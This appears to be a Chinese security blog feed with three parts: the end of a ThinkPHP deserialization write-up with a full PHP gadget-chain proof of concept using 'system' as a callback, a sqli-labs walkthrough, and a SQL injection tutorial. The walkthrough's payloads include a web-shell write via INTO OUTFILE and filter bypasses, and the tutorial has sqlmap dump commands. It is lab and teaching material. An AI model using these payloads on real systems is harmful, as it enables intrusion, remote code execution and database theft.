<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205401346.png" alt="image-20230302205401346"></p>
<p>这样$data就可控，就想当于可以控制$data，再跟进getFilter函数</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205554731.png" alt="image-20230302205554731"></p>
<p>input函数中有</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210600148.png" alt="image-20230302210600148"></p>
<p>因为getFilter会直接返回$filter，所以$filter就等于$this-&gt;filter，需要定义<code>$this-&gt;filter</code>为函数名</p>
<p>这样call_user_func函数的回调函数可控，只剩下回调函数的参数</p>
<p>再看input函数</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210753895.png" alt="image-20230302210753895"></p>
<p>这里可以进行回调，跟进filterValue函数</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210851115.png" alt="image-20230302210851115"></p>
<p>分析发现，在input函数中</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305114544744.png" alt="image-20230305114544744"></p>
<p>如果<code>$data</code>不可控，如果<code>$data</code>可控，而且<code>$name</code>为空字符串的话，input函数中前面的那些代码if条件就不成立，不构成影响，<code>$data</code>也就是回调函数的参数</p>
<p>最终，$data和$filter都可控，<code>$value = call_user_func($filter, $value);</code>这样这个就可以使用</p>
<p>最终poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[]=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()</span><br><span class="line">            );</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="variable language_">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305165150060.png" alt="image-20230305165150060"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡</title>
    <url>/2022/11/19/sqli-labs/</url>
    <content><![CDATA[<p>简介</p>
<span id="more"></span>

<p>数据库：security<br>表：emails,referers,uagents,users<br>列：USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>字符型 id&#x3D;’’</p>
<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>数字型 id&#x3D;</p>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>带括号的字符型 id&#x3D;(‘’)</p>
<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>带括号的字符型 id&#x3D;(“”)</p>
<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>字符型 id&#x3D;’’<br>需要使用布尔盲注 单引号</p>
<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>字符型 id&#x3D;’’<br>使用布尔盲注 双引号</p>
<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p><a href="http://localhost/sqli-labs-master/Less-7/?id=1&#39;">http://localhost/sqli-labs-master/Less-7/?id=1&#39;</a>)) union select 1,2,”<?php @eval($_POST['pass']);?>“ into outfile “E:\phpstudy\phpstudy_pro\WWW\sqli-labs-master\Less-7\pass.php”–+<br>使用文件上传</p>
<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>字符型  id&#x3D;’’<br>使用布尔盲注</p>
<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>时间延迟  单引号</p>
<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>时间延迟  双引号</p>
<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><p>post注入 字符型<br>id&#x3D;’’</p>
<h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h3><p>post注入<br>id&#x3D;(“”)<br>uname&#x3D;&amp;passwd&#x3D;1”) union select 1,2#&amp;submit&#x3D;Submit</p>
<h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><p>post的报错型注入<br>使用’)</p>
<h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><p>post的报错型注入<br>和十三关相似<br>使用”</p>
<h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h3><p>post的时间延迟注入<br>使用’</p>
<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h3><p>post的时间延迟注入<br>使用”）</p>
<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>username进行了过滤  可以在password进行注入<br>先输入对的username<br>再进行报错型注入<br>使用’<br>‘and extractvalue(1,concat(0x7e,(select database()))) and’1’&#x3D;’1</p>
<h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p>需要登录正确的username和password<br>username和password都存在过滤<br>去User-Agent进行注入，先将values进行闭合<br>使用报错型注入<br>User-Agent: 1’,1,updatexml(1,concat(0x5e,database()),1))#<br>或者<br>User-Agent: ‘and extractvalue(1,concat(0x7e,(select database()))) and’1’&#x3D;’1</p>
<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p>需要登录正确的username和password<br>去Referer进行注入，先将values进行闭合<br>使用报错型注入<br>Referer: 1’,updatexml(1,concat(0x5e,database()),1))#</p>
<h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h3><p>需要登录正确的username和password<br>去cookie进行注入<br>使用联合注入<br>Cookie: uname&#x3D;’ union select 1,2,database()#</p>
<h3 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h3><p>需要登录正确的username和password<br>去cookie进行注入<br>使用联合注入<br>但这里有base64编码<br>原注入语句为’) union select 1,group_concat(schema_name),3 from information_schema.schemata #<br>需要进行编码为JykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhICM&#x3D;<br>Cookie: uname&#x3D;’) union select 1,group_concat(schema_name),3 from information_schema.schemata #</p>
<h3 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h3><p>需要登录正确的username和password<br>去cookie进行注入<br>使用联合注入<br>但这里有base64编码<br>原注入语句为” union select 1,group_concat(schema_name),3 from information_schema.schemata #<br>需要进行编码，和第二十一关差不多</p>
<h3 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h3><p>过滤了注释<br>使用?id&#x3D;-1’ union select 1,database(),3 or ‘1’&#x3D;’1来获取数据库，3 or ‘1’&#x3D;’1是一体的只会返回1</p>
<h3 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h3><p>二次注入<br>注册admin’# php会对其进行转义保存进数据库中<br>修改admin’#的密码相当于修改admin的密码此时语句变成了’admin’#’</p>
<h3 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h3><p>将or和and过滤了<br>进行get注入<br>使用?id&#x3D;1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’–+<br>但or和and过滤，而information_schema.tables中有or需要写成infoorrmation_schema.tables</p>
<h3 id="第二十五a关"><a href="#第二十五a关" class="headerlink" title="第二十五a关"></a>第二十五a关</h3><p>字符型<br>将or和and过滤了<br>使用get的普通注入就可以</p>
<h3 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h3><p>使用 “%a0” 或 “%0b” 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”<br>过滤了空格，or，and，&#x2F;<br>使用报错型注入<br>?id&#x3D;1’||updatexml(1,concat(0x7e,(SELECT(group_concat(table_name))FROM(infoorrmation_schema.tables)WHERE(table_schema&#x3D;’security’))),1)||’1’&#x3D;’1</p>
<h3 id="第二十六a关"><a href="#第二十六a关" class="headerlink" title="第二十六a关"></a>第二十六a关</h3><p>使用布尔盲注脚本<br>空格绕过无法使用<br>无法使用报错型注入，无报错内容<br>空格，or，and，&#x2F;&#x2F;都被过滤<br><a href="http://localhost/sqli-labs-master/Less-26a/?id=1&#39;aandnd(substr((select(group_concat(0x3a,0x3a,id,username))from(users)),%d,1)=&#39;%s&#39;)aandnd&#39;1">http://localhost/sqli-labs-master/Less-26a/?id=1&#39;aandnd(substr((select(group_concat(0x3a,0x3a,id,username))from(users)),%d,1)=&#39;%s&#39;)aandnd&#39;1</a></p>
<h3 id="第二十七关"><a href="#第二十七关" class="headerlink" title="第二十七关"></a>第二十七关</h3><p>使用单引号<br>过滤了&#x2F;<em><em>&#x2F;,#,union,select,空格<br>使用绕过<a href="http://localhost:8088/sqlilabs/Less-27/?id=0&#39;/">http://localhost:8088/sqlilabs/Less-27/?id=0&#39;/</a></em>%0a*&#x2F;UnIoN&#x2F;*%0a</em>&#x2F;SeLeCt&#x2F;<em>%0a</em>&#x2F;2,database(),4&#x2F;<em>%0a</em>&#x2F;||&#x2F;<em>%0a</em>&#x2F;‘1’&#x3D;’1<br>&#x2F;<em>%0a</em>&#x2F;强行制造空格，后面进行单引号闭合</p>
<h3 id="第二十七a关"><a href="#第二十七a关" class="headerlink" title="第二十七a关"></a>第二十七a关</h3><p>使用双引号<br>和二十七关差不多</p>
<p>过滤<br>1.注释符号被过滤：使用or ‘a’&#x3D;’b的方式来绕过<br>2.空格被过滤：使用%a0空格，%a0换行，%09tab键，%0c来绕过<br>3.and和or被绕过：用&amp;&amp;和||来代替<br>4.union和select被绕过：使用sElect，uniOn等来代替</p>
<h3 id="第二十八关"><a href="#第二十八关" class="headerlink" title="第二十八关"></a>第二十八关</h3><p>union select组合被过滤，不能使用组合<br>使用<a href="http://localhost/sqli-labs-master/Less-28a/?id=a&#39;)%0aunion%0aunion%0aselectselect%0a1,2,database();%00">http://localhost/sqli-labs-master/Less-28a/?id=a&#39;)%0aunion%0aunion%0aselectselect%0a1,2,database();%00</a></p>
<h3 id="第二十八a关"><a href="#第二十八a关" class="headerlink" title="第二十八a关"></a>第二十八a关</h3><p>和二十八关一样</p>
<h3 id="第二十九关"><a href="#第二十九关" class="headerlink" title="第二十九关"></a>第二十九关</h3><p>使用’<br>WAF绕过<br>在页面使用联合注入那么就和第一关一样<br>在源文件中有login.php在其中进行注入<br><a href="http://127.0.0.1/sql1/Less-29/login.php?id=1%E5%8F%AF%E4%BB%A5%E5%9B%9E%E6%98%BE">http://127.0.0.1/sql1/Less-29/login.php?id=1可以回显</a><br>使用<a href="http://127.0.0.1/sql1/Less-29/login.php?id=1&#39;%E6%98%BE%E7%A4%BA%E8%A2%ABwaf%E6%8B%A6%E4%B8%8B">http://127.0.0.1/sql1/Less-29/login.php?id=1&#39;显示被waf拦下</a><br>再使用<a href="http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=2%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87waf%E7%84%B6%E5%90%8E%E5%9B%9E%E6%98%BE">http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=2可以绕过waf然后回显</a><br>然后进行正常的注入<a href="http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=0&#39;">http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=0&#39;</a> union select 1,2,3–+</p>
<h3 id="第三十关"><a href="#第三十关" class="headerlink" title="第三十关"></a>第三十关</h3><p>和第二十九关一样<br>使用”</p>
<h3 id="第三十一关"><a href="#第三十一关" class="headerlink" title="第三十一关"></a>第三十一关</h3><p>和第二十九关一样<br>使用”)</p>
<h3 id="第三十二关"><a href="#第三十二关" class="headerlink" title="第三十二关"></a>第三十二关</h3><p>GBK双字节编码：一个汉字用两个字节表示<br>宽字节绕过引号转义<br>会在’前面自动添加<br>使用%df’ php自动处理后为%df&#39;<br>%df\连接变为一个汉字，这样就可以单引号逃逸<br><a href="http://localhost/sqli-labs-master/Less-32/?id=%EF%BF%BD&#39;">http://localhost/sqli-labs-master/Less-32/?id=%df&#39;</a> union select 1,2,3–+<br>后面爆表的时候table_schema&#x3D;’数据库’  可以将’数据库’改为使用十六进制</p>
<h3 id="第三十三关"><a href="#第三十三关" class="headerlink" title="第三十三关"></a>第三十三关</h3><p>和第三十二关一样</p>
<h3 id="第三十四关"><a href="#第三十四关" class="headerlink" title="第三十四关"></a>第三十四关</h3><p>为post的斜杠转义，但转义方式与get型的不相同<br>uname&#x3D;%df’ union select 1,2#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit<br>不能使用hackbar，会自动将%df的%换成%25，变为%25df，post无法将其再次解码为%<br>使用burp来注入</p>
<h3 id="第三十五关"><a href="#第三十五关" class="headerlink" title="第三十五关"></a>第三十五关</h3><p>数字型<br>直接使用联合注入<br>table_schema&#x3D;’数据库’的’数据库’使用十六进制</p>
<h3 id="第三十六关"><a href="#第三十六关" class="headerlink" title="第三十六关"></a>第三十六关</h3><p>和第三十二关一样</p>
<h3 id="第三十七关"><a href="#第三十七关" class="headerlink" title="第三十七关"></a>第三十七关</h3><p>和第三十五关一样</p>
<h3 id="第三十八关"><a href="#第三十八关" class="headerlink" title="第三十八关"></a>第三十八关</h3><p>使用’<br>堆叠查询注入<br>堆叠查询注入攻击可以执行多条语句，多语句之间以分号隔开</p>
<h3 id="第三十九关"><a href="#第三十九关" class="headerlink" title="第三十九关"></a>第三十九关</h3><p>数字型<br>和三十八关一样</p>
<h3 id="第四十关"><a href="#第四十关" class="headerlink" title="第四十关"></a>第四十关</h3><p>使用’)<br>可以使用联合注入也可以使用布尔盲注<br>没有报错，无法使用报错型注入</p>
]]></content>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2022/11/19/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>sql注入的部分类型</p>
<span id="more"></span>

<p><strong>注入类型:联合注入，布尔盲注，关于时间的注入(利用时间延迟)，报错型注入，请求头注入，堆叠查询注入</strong></p>
<h2 id="一-联合注入"><a href="#一-联合注入" class="headerlink" title="一.联合注入"></a>一.联合注入</h2><h4 id="1-union的使用"><a href="#1-union的使用" class="headerlink" title="1.union的使用"></a>1.union的使用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法sql1 union sql2</span><br><span class="line">注意:两条sql语句查询的字段数必须相同</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 union select 1#</span><br><span class="line">如果报错再进行</span><br><span class="line">select * from 表名 union select 1,2#</span><br><span class="line">select * from 表名 union select 1,2,3#</span><br><span class="line">直到不再报错</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">?id=1&#x27; order by 4--+</span><br><span class="line"></span><br><span class="line">//sql注入漏洞，就是通过拼接union后语句实现获取数据库隐私信息</span><br></pre></td></tr></table></figure>

<h4 id="2-特殊库使用"><a href="#2-特殊库使用" class="headerlink" title="2.特殊库使用"></a>2.特殊库使用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">库名:information_schema</span><br><span class="line">作用:存储mysql中所有库名、表名、列名，是mysql的字典</span><br><span class="line">应用:sql注入经常从此库中获取需要的库名、表名、字段名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from information_schema.tables\G;//查看所有表</span><br><span class="line">select * from information_schema.columns\G;//查看所有字段</span><br><span class="line">select distinct table_schema from information_schema.tables;//查看数据库</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27;;//查看表</span><br><span class="line">数据库名:table_schema</span><br><span class="line">表名:table_name</span><br><span class="line">列名:columns_name</span><br></pre></td></tr></table></figure>

<h4 id="3-查找注入点"><a href="#3-查找注入点" class="headerlink" title="3.查找注入点"></a>3.查找注入点</h4><p>注释字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一.单行注释: #和--   注意使用-- 时后面必须有一个空格</span><br><span class="line">二.多行注释: /*内容*/</span><br></pre></td></tr></table></figure>

<p>获取字段数 (union前后的select的语句的字段数必须相同才能使用)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1#</span><br><span class="line">如果报错再进行</span><br><span class="line">union select 1,2#</span><br><span class="line">union select 1,2,3#</span><br><span class="line">直到不再报错</span><br></pre></td></tr></table></figure>

<p>获取库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前提前面的sql如果该字段有3列</span><br><span class="line">select * from 表名 union select 1,2,database();</span><br></pre></td></tr></table></figure>

<p>获取表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前提前面的sql如果该字段有3列</span><br><span class="line">select * from 表名 union select group_concat(table_name),1,2 from information_schema.tables where table_schema=&#x27;数据库&#x27;;</span><br></pre></td></tr></table></figure>

<p>获取列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前提前面的sql如果该字段有3列</span><br><span class="line">select * from 表名 union select group_concat(column_name),1,2 from information_schema.columns where table_name=&#x27;表名&#x27;;</span><br></pre></td></tr></table></figure>

<p>获取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前提前面的sql如果该字段有2列</span><br><span class="line">比如要获取user和password字段的数据</span><br><span class="line">select * from 表名 union select user,password from 表名;</span><br><span class="line">或者select * from 表名 union select 1,group_concat(user,password) from 表名;</span><br></pre></td></tr></table></figure>

<p>group_concat()是将所有数据输出</p>
<h4 id="4-解决字段数限制"><a href="#4-解决字段数限制" class="headerlink" title="4.解决字段数限制"></a>4.解决字段数限制</h4><p>由于后台sql默认查询字段数限制，注入时只能获取相同字段的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用concat函数</span><br><span class="line">语法concat(str1,str2,....)</span><br><span class="line">select 列名,concat(列名,&#x27; &#x27;,列名) from 表名; //&#x27; &#x27;是防止连在一起</span><br></pre></td></tr></table></figure>

<h4 id="5-自动注入"><a href="#5-自动注入" class="headerlink" title="5.自动注入"></a>5.自动注入</h4><p>工具:sqlmap</p>
<p><strong>用法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: sqlmap 参数</span><br><span class="line">-u:扫描的目标url</span><br><span class="line">--batch:自动处理提示信息</span><br><span class="line">--cookie:附加cookie参数</span><br><span class="line">实例:python sqlmap.py --batch -u &quot;网址&quot; --cookie=&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>扫描注入点(先判断是字符注入还是数字注入)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --batch -u &quot;网址&quot; --cookie=&quot;&quot;</span><br><span class="line">//cookie可以在F12中寻找，没有cookie无法登录进去</span><br></pre></td></tr></table></figure>

<p>获取数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--current-db:查询当前web使用的数据库名</span><br><span class="line">-D:应用指定数据库</span><br><span class="line">python sqlmap.py --batch -u &quot;网址&quot; --cookie=&quot;&quot; --current-db//获取数据库</span><br></pre></td></tr></table></figure>

<p>获取表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--tables:查询指定库下所有表名</span><br><span class="line">-T:指定表</span><br><span class="line">获取数据库名以后python sqlmap.py --batch -u &quot;网址&quot; --cookie=&quot;&quot; -D 库名 --tables//获取表</span><br></pre></td></tr></table></figure>

<p>获取字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--columns:查询指定表下所有字段</span><br><span class="line">-C:指定字段名</span><br><span class="line">获取表以后python sqlmap.py --batch -u &quot;网址&quot; --cookie=&quot;&quot; -D 库名 -T 表名 --columns//获取字段</span><br></pre></td></tr></table></figure>

<p>获取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--dump:下载数据</span><br><span class="line">获取字段后python sqlmap.py --batch -u &quot;网址&quot; --cookie=&quot;&quot; -D 库名 -T 表名 -C &quot;字段名,字段名&quot; --dump</span><br></pre></td></tr></table></figure>

<h2 id="二-布尔盲注-使用脚本"><a href="#二-布尔盲注-使用脚本" class="headerlink" title="二.布尔盲注(使用脚本)"></a>二.布尔盲注(使用脚本)</h2><h4 id="1-判断字段数"><a href="#1-判断字段数" class="headerlink" title="1.判断字段数"></a>1.判断字段数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  order by 1--+</span><br><span class="line">id=  order by 2--+</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">直到报错为止</span><br></pre></td></tr></table></figure>

<h4 id="2-判断数据库名的长度"><a href="#2-判断数据库名的长度" class="headerlink" title="2.判断数据库名的长度"></a>2.判断数据库名的长度</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用length函数</span><br><span class="line">id=  and length(database())=1--+</span><br><span class="line">id=  and length(database())=2--+</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">直到页面回到正常</span><br></pre></td></tr></table></figure>

<h4 id="3-猜数据库名"><a href="#3-猜数据库名" class="headerlink" title="3.猜数据库名"></a>3.猜数据库名</h4><p>substr函数:substr(参数1，参数2，参数3)</p>
<p>参数1：需要截取的字符串</p>
<p>参数2：截取字符串的位置</p>
<p>参数3：要截取字符串的长度</p>
<p>mid函数:mid(参数1，参数2，参数3)</p>
<p>参数1：是字符串</p>
<p>参数2：是起始子字符串的位置</p>
<p>参数3：是一个可选参数，它决定从起始位置返回的字符数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and substr(database(),1,1)=&#x27;&#x27;</span><br><span class="line">id=  and substr(database(),2,1)=&#x27;&#x27;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">猜出数据库每一位</span><br></pre></td></tr></table></figure>

<h4 id="4-猜表名"><a href="#4-猜表名" class="headerlink" title="4.猜表名"></a>4.猜表名</h4><p>limit i,n</p>
<p>i是查询结果的索引值</p>
<p>n是查询结果返回的数量</p>
<p><strong>有几个表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and (select count(table_name) from information_schema.tables where table_schema=数据库名)=1--+</span><br><span class="line">如果显示对的那database()这个数据库中有1个表,如果显示错那么就不是一个表</span><br></pre></td></tr></table></figure>

<p><strong>表名的长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设该数据库有两个表</span><br><span class="line"></span><br><span class="line">查询第一个表的长度</span><br><span class="line">id=  and length(substr((select table_name from information_schema.tables where table_schema=数据库名 limit 0,1),1))=9--+</span><br><span class="line">如果显示正确则该表长度为9</span><br><span class="line"></span><br><span class="line">查询第二个表的长度</span><br><span class="line">id=  and length(substr((select table_name from information_schema.tables where table_schema=数据库名 limit 1,1),1))=9--+</span><br></pre></td></tr></table></figure>

<p><strong>表的名字</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and substr((select table_name from information_schema.tables where table_schema=数据库名 limit i,1),n,1)=&#x27;&#x27;--+</span><br><span class="line">i是第几个表</span><br><span class="line">n是第几个字符</span><br></pre></td></tr></table></figure>

